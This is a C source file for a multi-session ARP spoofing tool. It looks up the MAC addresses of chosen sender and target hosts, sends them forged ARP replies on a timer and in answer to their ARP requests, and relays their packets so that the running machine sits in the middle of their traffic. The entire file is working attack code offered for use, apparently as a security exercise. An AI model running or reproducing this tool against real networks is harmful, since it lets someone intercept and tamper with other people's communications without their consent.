#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <pthread.h>

#define HWTYPE_ETHER   0x01
#define IP_LENGTH	   0x04
#define ETHER_LENGTH   0x06
#define ETHERTYPE_IP   0x0800
#define ETHERTYPE_ARP  0x0806

typedef struct packet_info{
	char dev[10];
	in_addr my_ip[4];
	in_addr src_ip[4];
	in_addr dst_ip[4];
	u_char myMac[6];
	u_char srcMac[6];
	u_char dstMac[6];
} packet_info;

typedef struct all_info{
	char dev[10];
	in_addr my_ip[4];
	u_char myMac[6];
	in_addr *all_src_ip;
	in_addr *all_dst_ip;
	int session_n;
} all_info;

void printmac(u_char *srcMac)
{
	printf("mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
		srcMac[0], srcMac[1], srcMac[2],
		srcMac[3], srcMac[4], srcMac[5]);	
}

void printip(u_char *ip)
{
	printf("ip: %u.%u.%u.%u\n",ip[0], ip[1], ip[2], ip[3]);
}

void usage()
{
	printf("usage:	arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("ex : 	arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void GetMyInfo(char* dev,unsigned char *my_mac, struct in_addr *my_ip){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    strcpy(s.ifr_name, dev);
    if (ioctl(fd, SIOCGIFHWADDR, &s)) {
        printf("Can't Get Mac Address!!\n");
        exit(1);
    }
    memcpy(my_mac, s.ifr_addr.sa_data, 6);
    if (ioctl(fd, SIOCGIFADDR, &s)) {
        printf("Can't Get IP Address!!\n");
        exit(1);
    }
    memcpy(my_ip, (const void*)&(((sockaddr_in *)&s.ifr_addr)->sin_addr), 4);
}

void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, u_char *srcMac, u_char *dstMac, u_short opcode, const char *message)
{	
	/*
	printf("src_ip: %s\n",inet_ntoa(*src_ip));
	printf("dst_ip: %s\n",inet_ntoa(*dst_ip));
	printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
		srcMac[0], srcMac[1], srcMac[2],
		srcMac[3], srcMac[4], srcMac[5]);
	printf("dst_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
		dstMac[0], dstMac[1], dstMac[2],
		dstMac[3], dstMac[4], dstMac[5]);
	printf("%s\n", message);
	*/

	unsigned char packet[ETHERMTU];
	struct ether_header *eth_h;
	struct ether_arp *arp_h;

	memset(packet, 0, ETHERMTU);

	eth_h = (struct ether_header*)packet;
	memcpy(eth_h->ether_dhost, dstMac, 6);
	memcpy(eth_h->ether_shost, srcMac, 6);
	eth_h->ether_type = htons(ETHERTYPE_ARP);
	
	arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	arp_h->ea_hdr.ar_hrd = htons(HWTYPE_ETHER);
	arp_h->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
	arp_h->ea_hdr.ar_hln = ETHER_LENGTH;
	arp_h->ea_hdr.ar_pln = IP_LENGTH;
	arp_h->ea_hdr.ar_op = htons(opcode);
	memcpy(arp_h->arp_sha, srcMac, 6);
	memcpy(arp_h->arp_spa, src_ip, 4);

	if(!memcmp(dstMac, "\xff\xff\xff\xff\xff\xff", 6))
		memcpy(arp_h->arp_tha, "\x00\x00\x00\x00\x00\x00", 6);
	else
		memcpy(arp_h->arp_tha, dstMac, 6);
	memcpy(arp_h->arp_tpa, dst_ip, 4);
	if(pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp)))
		printf("%s SendPacket Failed\n", message);
	else
		printf("%s SendPacket Success!\n", message);
}

void GetTargetMac(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac)
{
	unsigned char broadcast[7] = "\xff\xff\xff\xff\xff\xff";

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	  exit(1);
	}

  	while (true) {
		struct pcap_pkthdr* header;
		struct ether_header* eth_h;
	    struct ether_arp* arp_h;

	    const u_char* packet;
	    unsigned short eth_type;

	    int res = pcap_next_ex(handle, &header, &packet);

	    if (res == 0)
	   	{
	   		SendPacket(handle, src_ip, dst_ip, srcMac, broadcast, 1, "GetMac");
	   		continue;
	   	}

	    if (res == -1 || res == -2) break;

	    eth_h = (struct ether_header*)packet;
	    eth_type = htons(eth_h->ether_type);
	    if (eth_type == ETHERTYPE_ARP)
	    {
	      arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	      if(!memcmp(dst_ip, arp_h->arp_spa, 4))
	      {
	      	memcpy(dstMac, arp_h->arp_sha, 6);
	      	pcap_close(handle);
	      	return;
	      }
    	}
    	else
    	{
    		if (pcap_sendpacket(handle, packet, sizeof(packet)))
    			printf("Packet Relay Success!!\n");
    		else
    			printf("Packet Relay Failed!!\n");
    	}
  	}
}

void* ARPInfection_regular(void *pinfo)
{
	packet_info info;
	memcpy(&info, pinfo, sizeof(packet_info));

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(info.dev, BUFSIZ, 1, 1000, errbuf);
	
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", info.dev, errbuf);
	  exit(1);
	}

	GetTargetMac(info.dev, info.my_ip, info.src_ip, info.myMac, info.srcMac);
	GetTargetMac(info.dev, info.my_ip, info.dst_ip, info.myMac, info.dstMac);

	printf("==============================\n");
	printf("my_ip: %s\n", inet_ntoa(*info.my_ip));
	printf("src_ip: %s\n",inet_ntoa(*info.src_ip));
	printf("dst_ip: %s\n",inet_ntoa(*info.dst_ip));
	printmac(info.myMac);
	printmac(info.srcMac);
	printmac(info.dstMac);
	printf("==============================\n");

	while(true)
	{
		SendPacket(handle, info.dst_ip, info.src_ip,
			info.myMac, info.srcMac, 2, "Regular");
		SendPacket(handle, info.src_ip, info.dst_ip,
			info.myMac, info.dstMac, 2, "Regular");
		sleep(60);
	}

	pcap_close(handle);
}

void* ARPInfection_irregular(void *ainfo)
{
	all_info *info = (all_info*)ainfo;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(info->dev, BUFSIZ, 1, 1000, errbuf);
	
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", info->dev, errbuf);
	  exit(1);
	}

	while (true) {
		struct pcap_pkthdr* header;
		struct ether_header* eth_h;
	    struct ether_arp* arp_h;

	    const u_char* packet;
	    unsigned short eth_type;
	    u_char srcMac[6];
	    u_char dstMac[6];

	    int res = pcap_next_ex(handle, &header, &packet);
	    int flag = 0;

	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;

	    eth_h = (struct ether_header*)packet;
	    eth_type = htons(eth_h->ether_type);
	    if (eth_type == ETHERTYPE_ARP)
	    {
	      arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));

	      for(int i = 0; i < info->session_n; i++)
	      {
	      	if(!memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4) &&
	      		!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x01)){
	      		GetTargetMac(info->dev, info->my_ip, &(info->all_dst_ip[i]), info->myMac, dstMac);
	      		SendPacket(handle, &(info->all_src_ip[i]), &(info->all_dst_ip[i]),
	      			info->myMac, dstMac, 2, "Irregular");
	      		flag = 1;
	      		break;
	      	}
	      	else if (!memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4) &&
	      		!memcmp((char*)info->all_dst_ip, arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x01)){	
	      		GetTargetMac(info->dev, info->my_ip, &(info->all_src_ip[i]), info->myMac, srcMac);
	      		SendPacket(handle, &(info->all_dst_ip[i]), &(info->all_src_ip[i]),
	      			info->myMac, srcMac, 2, "Irregular");
	      		flag = 1;
	      		break;
	      	}
	  	  }
	  	  if (flag)
	  	  {
	  	  	flag = 0;
	  	  	continue;
	  	  }
    	}
    
		if(pcap_sendpacket(handle, packet, sizeof(packet)))
			printf("Packet Relay Success!!\n");
		else
			printf("Packet Relay Failed!!\n");
  	}
}

int main(int argc, char *argv[])
{
	pthread_t *threads;
	pthread_t athread;
	char *dev;
	struct in_addr *sender_ip;
	struct in_addr *target_ip;
	struct in_addr LocalIP;
	unsigned char LocalMac[6];
	int session_n = (argc - 2) / 2;
	int *thr_id;
	int athr_id;
	packet_info *pinfo;
	all_info ainfo;

	if((argc < 3) || (argc % 2))
	{
		usage();
		return 0;
	}

	dev = argv[1];
	sender_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
	target_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
	ainfo.all_src_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
	ainfo.all_dst_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));


	for(int i = 0; i < session_n; i++)
	{
		inet_aton(argv[2*i + 2], &(sender_ip[i]));
		inet_aton(argv[2*i + 3], &(target_ip[i]));
	}

	threads = (pthread_t*)malloc(session_n * sizeof(pthread_t));
	pinfo = (packet_info*)malloc(session_n * sizeof(packet_info));
	thr_id = (int*)malloc(session_n * sizeof(int));

	GetMyInfo(dev, LocalMac, &LocalIP);

	for(int i = 0; i < session_n; i++)
	{
		memcpy(pinfo[i].dev, dev, sizeof(dev));
		memcpy(pinfo[i].my_ip, (in_addr*)&LocalIP, 4);
		memcpy(pinfo[i].src_ip, (in_addr*)&sender_ip[i], 4);
		memcpy(&ainfo.all_src_ip[i], (in_addr*)&sender_ip[i], 4);
		memcpy(pinfo[i].dst_ip, (in_addr*)&target_ip[i], 4);
		memcpy(&ainfo.all_dst_ip[i], (in_addr*)&target_ip[i], 4);
		memcpy(pinfo[i].myMac, LocalMac, 6);
		memset(pinfo[i].srcMac, 0, 6);
		memset(pinfo[i].dstMac, 0, 6);
		thr_id[i] = pthread_create(&threads[i], NULL, ARPInfection_regular, (void*)&pinfo[i]);
		if (thr_id[i] < 0)
		{
			perror("thread create error!!\n");
			exit(1);
		}
		else
			printf("thread create success!!\n");
	}

	memcpy(ainfo.dev, dev, sizeof(dev));
	memcpy(ainfo.my_ip, (in_addr*)&LocalIP, 4);
	memcpy(ainfo.myMac, LocalMac, 6);
	ainfo.session_n = session_n;
	athr_id = pthread_create(&athread, NULL, ARPInfection_irregular, (void*)&ainfo);
	if (athr_id < 0)
	{
		perror("athread create error!!\n");
		exit(1);
	}
	else
		printf("athread create success!!\n");

/*
	for(int i = 0; i < session_n; i++)
		printf("%d: %s\n", i, inet_ntoa(ainfo.all_src_ip[i]));
	for(int i = 0; i < session_n; i++)
		printf("%d: %s\n", i, inet_ntoa(ainfo.all_dst_ip[i]));
*/

	for(int i = 0; i < session_n; i++)
		pthread_join(threads[i], NULL);
	pthread_join(athread, NULL);
	free(threads);
	free(pinfo);
	free(thr_id);
	free(sender_ip);
	free(ainfo.all_src_ip);
	free(ainfo.all_dst_ip);
}
